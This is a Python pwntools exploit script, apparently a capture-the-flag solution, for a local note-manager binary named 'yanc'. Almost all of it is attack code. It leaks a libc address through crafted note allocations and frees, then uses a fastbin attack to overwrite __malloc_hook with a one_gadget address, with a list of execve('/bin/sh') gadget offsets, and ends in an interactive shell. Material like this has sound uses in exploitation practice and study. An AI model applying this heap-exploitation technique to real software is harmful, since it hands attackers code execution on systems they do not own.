from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./yanc"
bin = ELF(file)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

conn = process(file)
#gdb.attach(conn)

def menu(ch):
    conn.recvuntil("quit")
    conn.sendline(str(ch))

def add(note, title, shell=False):
    menu(1)
    conn.recvuntil("Enter note : ")
    conn.send(note)
    if shell:
        return
    conn.recvuntil("Enter title : ")
    conn.send(title)

def delete(idx):
    menu(2)
    conn.recvuntil("Which one :")
    conn.sendline(str(idx))

def view():
    menu(3)

# Libc leak:
add("note2\n", "title2\n")
add("note3\n", "title3\n")
add("note1" + "a"*0x90 + "\n", "title1\n")
add("note4\n", "title4\n")
delete(2)
delete(0)
add("note2\n", "a"*0x20 + "\x50")
view()
conn.recvuntil("Note : ")
conn.recvuntil("Note : ")
libc_leak = u64(conn.recvn(6) + "\x00\x00")

libc.address = libc_leak - 0x7fbe3ce99b78 + 0x7fbe3cad5000

# Clearing
delete(0)
add("note2\n", "a"*0x20 + "\x30")
delete(0)
delete(1)
delete(3)
add("a"*0xb0 + "\n", "title\n")
delete(0)

# pwning
add("note1" + "a"*0x60 + "\n", "title1\n")
add("note2" + "a"*0x60 + "\n", "title2\n")
add("note3" + "a"*0x60 + "\n", "title3\n")
delete(0)
add("note1" + "a"*0x60 + "\n", "a"*0x20 + "\x10")
delete(0)
delete(2)
delete(1)

payload = p64(libc.symbols['__malloc_hook'] - 0x23)
payload = payload.ljust(0x60, "\x00") + "\n"
add(payload, "title1\n")
add("a"*0x60 + "\n", "title2\n")
add("a"*0x60 + "\n", "title2\n")

"""
0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xcd0f3 execve("/bin/sh", rcx, r12)
constraints:
  [rcx] == NULL || rcx == NULL
  [r12] == NULL || r12 == NULL

0xcd1c8 execve("/bin/sh", rax, r12)
constraints:
  [rax] == NULL || rax == NULL
  [r12] == NULL || r12 == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0xf66f0 execve("/bin/sh", rcx, [rbp-0xf8])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL
"""

one_gadget_addr = libc.address + 0xf02a4
payload = "\x00"*0x13 + p64(one_gadget_addr)
payload = payload.ljust(0x60, "\x00") + "\n"
add(payload, "title3\n")
add("a\n", "whoami\n", shell=True)

log.info("Libc leak: " + hex(libc_leak))

conn.interactive()
